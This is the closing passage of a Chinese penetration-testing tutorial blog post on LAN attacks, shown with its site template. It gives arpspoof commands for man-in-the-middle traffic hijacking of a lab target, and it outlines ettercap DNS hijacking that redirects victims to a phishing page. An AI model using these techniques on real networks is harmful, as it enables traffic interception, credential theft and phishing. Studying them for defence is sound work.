<p>双向欺骗：攻击机一直发送伪造的数据包，欺骗网关自己是靶机，欺骗靶 机自己是网关，同时开启路由转发功能，就可以让靶机在正常上网的情况下截 获网络数据包，所有数据都会经过攻击机再转发给靶机。</p>
<ul>
<li>单向断网限制</li>
</ul>
<p>科来网络分析系统，科来数据包生成器，封装数据包，给靶机造成假象，认为攻击机才是网关地址，造成靶机无法正常上网。</p>
<ul>
<li>双向劫持数据</li>
</ul>
<p>Arpspoof Wireshark 科来网络分析系统<br>
 Arpspoof Windows:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsYW5kYXUvYXJwc3Bvb2Y=">https://github.com/alandau/arpspoof</span><br>
Arpspoof Linux:apt-get install dsniff</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启转发</span></span><br><span class="line">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果不开启转发，流量被检测到之后，对方无法正常通讯网络</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启欺骗</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.9 -r 192.168.1.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">- i 指定进行arp攻击的网卡、-t 目标主机IP、-r 进行双向攻击、最后为网关的IP地址</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">WireShark&amp;科来网络分析系统：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分析是否能够捕获到双向劫持靶机上的流量 ip.addr==192.168.1.9</span></span><br></pre></td></tr></table></figure>
<ul>
<li>双向 DNS 劫持配合钓鱼：</li>
</ul>
<p>使用 kali 自带的 ettercap -G 进行 dns 劫持，将目标主机访问特定 url 地址的 流量解析到 ettercap 配置文件中规定的解析地址，一般会在 kali 上开启 apache 服 务进行钓鱼。注意需要清除靶机上的 dns 缓存、浏览器缓存等。</p>
<p>设置劫持网卡、扫描网卡存活 IP、选择攻击目标 IP、启用 ARP 监听模式、 设置 DNS 劫持规则、启用 DNS 劫持插件。</p>

      <div class="tags">
          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-07-04 23:15:08" itemprop="dateModified" datetime="2023-07-04T23:15:08+08:00">2023-07-04</time>
  </span>
  <span id="2022/12/30/SAFE/11 内网安全/" class="item leancloud_visitors" data-flag-title="XD22 11 内网安全" title="阅读次数">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">阅读次数</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">次</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://www.n1h1l157.live/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="XD22 11 内网安全">http://www.n1h1l157.live/2022/12/30/SAFE/11 内网安全/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;42PBV1A3YGWyXN8.jpg" title="XD22 2 Web 通用漏洞">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
  <h3>XD22 2 Web 通用漏洞</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;VHIxW2qc1oAMOef.jpg" title="XD22 12 权限维持">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
  <h3>XD22 12 权限维持</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text"> 域信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8-%E6%9C%8D%E5%8A%A1-%E6%9D%83%E9%99%90%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 应用 服务 权限收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C-%E7%94%A8%E6%88%B7-%E5%9F%9F%E6%8E%A7%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text"> 网络 用户 域控收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81-%E5%87%AD%E6%8D%AE-%E5%8F%A3%E4%BB%A4%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.</span> <span class="toc-text"> 密码 凭据 口令收集</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">2.</span> <span class="toc-text"> 隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA"><span class="toc-number">2.1.</span> <span class="toc-text"> 隧道基础理论</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#icmp-%E9%9A%A7%E9%81%93"><span class="toc-number">2.2.</span> <span class="toc-text"> icmp 隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns-%E9%9A%A7%E9%81%93"><span class="toc-number">2.3.</span> <span class="toc-text"> dns 隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-%E9%9A%A7%E9%81%93"><span class="toc-number">2.4.</span> <span class="toc-text"> ssh 隧道</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text"> 代理技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%B3%E6%9D%BF%E6%9C%BA%E9%97%B4%E6%8E%A5%E6%8E%A7%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text"> 跳板机间接控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf-%E6%AD%A3%E5%90%91%E6%8E%A7%E5%88%B6"><span class="toc-number">3.2.</span> <span class="toc-text"> msf 正向控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs-%E6%AD%A3%E5%90%91%E6%8E%A7%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text"> cs 正向控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF"><span class="toc-number">3.4.</span> <span class="toc-text"> 不出网机器上线</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B8%8A%E7%BA%BF"><span class="toc-number">4.</span> <span class="toc-text"> 内网穿透上线</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ngrok-%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E6%9C%BA%E5%99%A8"><span class="toc-number">4.1.</span> <span class="toc-text"> Ngrok 上线内网机器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frp%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E6%9C%BA%E5%99%A8"><span class="toc-number">4.2.</span> <span class="toc-text"> Frp 上线内网机器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nps%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E6%9C%BA%E5%99%A8"><span class="toc-number">4.3.</span> <span class="toc-text"> Nps 上线内网机器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spp%E4%B8%8A%E7%BA%BF%E5%86%85%E7%BD%91%E6%9C%BA%E5%99%A8"><span class="toc-number">4.4.</span> <span class="toc-text"> Spp 上线内网机器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF"><span class="toc-number">5.</span> <span class="toc-text"> 横向渗透技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ipc-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">5.1.</span> <span class="toc-text"> IPC 横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmi-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.2.</span> <span class="toc-text"> WMI 横向渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#smb-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.3.</span> <span class="toc-text"> SMB 横向渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#crackmapexec"><span class="toc-number">5.4.</span> <span class="toc-text"> CrackMapExec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pth-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">5.5.</span> <span class="toc-text"> PTH 哈希传递攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ptt-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">5.6.</span> <span class="toc-text"> PTT 票据传递攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ptk-%E5%AF%86%E9%92%A5%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">5.7.</span> <span class="toc-text"> PTK 密钥传递攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rdp-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.8.</span> <span class="toc-text"> RDP 横向渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#winrm-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.9.</span> <span class="toc-text"> WinRM 横向渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spn-kerberos-%E6%94%BB%E5%87%BB"><span class="toc-number">5.10.</span> <span class="toc-text"> SPN Kerberos 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exchange-%E6%94%BB%E5%87%BB"><span class="toc-number">5.11.</span> <span class="toc-text"> Exchange 攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text"> 域控提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ms17010cve-2017-0146"><span class="toc-number">6.1.</span> <span class="toc-text"> MS17010（CVE-2017-0146）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ms14-068-cve-2014-6324"><span class="toc-number">6.2.</span> <span class="toc-text"> MS14-068 (CVE-2014-6324)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2020-1472"><span class="toc-number">6.3.</span> <span class="toc-text"> CVE-2020-1472</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2021-42287"><span class="toc-number">6.4.</span> <span class="toc-text"> CVE-2021-42287</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2022-26923"><span class="toc-number">6.5.</span> <span class="toc-text"> CVE-2022-26923</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%A8%AA%E5%90%91%E6%89%8B%E6%AE%B5"><span class="toc-number">7.</span> <span class="toc-text"> 其他横向手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ntlm-relay-%E9%87%8D%E6%94%BE"><span class="toc-number">7.1.</span> <span class="toc-text"> NTLM Relay 重放</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ntlm-inveigh-%E5%97%85%E6%8E%A2"><span class="toc-number">7.2.</span> <span class="toc-text"> NTLM Inveigh 嗅探</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="toc-number">7.3.</span> <span class="toc-text"> 委派攻击分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">7.4.</span> <span class="toc-text"> 非约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">7.5.</span> <span class="toc-text"> 约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">7.6.</span> <span class="toc-text"> 资源约束委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%AA%E5%90%91linux"><span class="toc-number">7.7.</span> <span class="toc-text"> 横向 linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">7.8.</span> <span class="toc-text"> 密码获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%B6%E5%9F%9F%E5%AD%90%E5%9F%9F"><span class="toc-number">7.9.</span> <span class="toc-text"> 父域子域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">7.10.</span> <span class="toc-text"> 局域网渗透</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></li><li><a href="/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="bookmark" title="XD22 10 免杀对抗">XD22 10 免杀对抗</a></li><li><a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="bookmark" title="XD22 12 权限维持">XD22 12 权限维持</a></li><li class="active"><a href="/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="bookmark" title="XD22 11 内网安全">XD22 11 内网安全</a></li><li><a href="/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="XD22 2 Web 通用漏洞">XD22 2 Web 通用漏洞</a></li><li><a href="/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 4 API 攻防">XD22 4 API 攻防</a></li><li><a href="/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 13 补充知识">XD22 13 补充知识</a></li><li><a href="/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" rel="bookmark" title="XD22 14 打破常规">XD22 14 打破常规</a></li><li><a href="/2022/12/30/SAFE/7%20waf%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 7 Waf 攻防">XD22 7 Waf 攻防</a></li><li><a href="/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="bookmark" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></li><li><a href="/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 3 服务攻防">XD22 3 服务攻防</a></li><li><a href="/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 5 APP 攻防">XD22 5 APP 攻防</a></li><li><a href="/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="bookmark" title="XD22 8 代码审计">XD22 8 代码审计</a></li><li><a href="/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="bookmark" title="XD22 9 权限提升">XD22 9 权限提升</a></li><li><a href="/2023/05/01/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/10/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt=".N1h1l157"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">.N1h1l157</p>
  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">166</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">5</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">39</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
  </li>

        
  <li class="item">
    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
  </li>

        
  <li class="item">
    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/149%20DURIAN/" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/4%E3%80%8A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC%E3%80%8B%E5%A4%AA%E5%AE%B0%E6%B2%BB/" title="《人间失格》太宰治">《人间失格》太宰治</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
</div>

    <span><a href="/2020/04/01/MBTI/%E4%B9%9D%E5%9E%8B%E4%BA%BA%E6%A0%BC/" title="九型人格">九型人格</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/148%20GITROOT/" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/16%E3%80%8A%E6%BF%92%E6%AD%BB%E7%BB%8F%E5%8E%86%E3%80%8B%E7%8E%9B%E4%B8%BD%E8%90%A8/" title="《濒死经历》玛丽萨">《濒死经历》玛丽萨</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
</div>

    <span><a href="/2019/07/01/BOOK/43%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/" title="《我是猫》夏目漱石">《我是猫》夏目漱石</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
</div>

    <span><a href="/2019/07/01/BOOK/44%E3%80%8A%E5%8F%8C%E5%9F%8E%E8%AE%B0%E3%80%8B%E6%9F%A5%E5%B0%94%E6%96%AF%C2%B7%E7%8B%84%E6%9B%B4%E6%96%AF/" title="《双城记》查尔斯·狄更斯">《双城记》查尔斯·狄更斯</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2019 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
  </div>

<!--   页面字数统计 -->
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="站点总字数">751k 字</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="站点阅读时长">20:52</span>
&nbsp;&nbsp;
    <!-- 网站总访问量: LeanCloud Counter 数据库中的 time的总和 -->
    <span id="total-visits">总访问量: 加载中...</span>

    <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.12.0/dist/av-min.js"></script>
    <script>
      // 获取 Shoka 配置中的 Valine 的 App ID 和 App Key
      var appId = "M0hjFtbBRwOEJlxXsjeK8FSL-gzGzoHsz";
      var appKey = "ggVu0OafepVPwl2xLNtZ38P9";

      // 使用 Valine 的 App ID 和 App Key 进行 LeanCloud 的初始化
      AV.init({
        appId: appId,
        appKey: appKey,
        serverURLs: 'https://m0hjftbb.lc-cn-n1-shared.com' // 请根据您的实际区域选择合适的服务器地址
      });

      // 查询 Counter 类
      const Counter = AV.Object.extend('Counter');
      const query = new AV.Query(Counter);

      // 获取所有数据
      query.limit(1000); // 如果数据量较大，可以适当调整 limit
      query.find().then((results) => {
        // 计算 time 字段的总和
        const totalVisits = results.reduce((sum, result) => sum + result.get('time'), 0);

        // 显示总访问量
        document.getElementById('total-visits').textContent = '总访问量：' + totalVisits;
      }).catch((error) => {
        console.error('获取访问量时出错：', error);
        document.getElementById('total-visits').textContent = '无法获取访问量';
      });
    </script>

  </div>

<!--   自定义开启一个网站的运行时间 -->
  <div class="site-uptime">
    运行时间: <span id="site-uptime"></span>
  </div>
  <script>
    var siteUptimeElement = document.getElementById('site-uptime');
    var siteSetupDate = new Date('2019-06-01'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
    setInterval(function() {
      var currentTime = new Date();
      var uptime = formatUptime(currentTime - siteSetupDate);
      siteUptimeElement.textContent = uptime;
    }, 1000);

    function formatUptime(milliseconds) {
      var seconds = Math.floor(milliseconds / 1000);
      var minutes = Math.floor(seconds / 60);
      var hours = Math.floor(minutes / 60);
      var days = Math.floor(hours / 24);

      var uptime = '';
      if (days > 0) {
        uptime += days + '天 ';
      }
      if (hours > 0) {
        uptime += (hours % 24) + '时 ';
      }
      if (minutes > 0) {
        uptime += (minutes % 60) + '分 ';
      }
      uptime += (seconds % 60) + '秒';

      return uptime;
    }
  </script>
  <div class="powered-by">
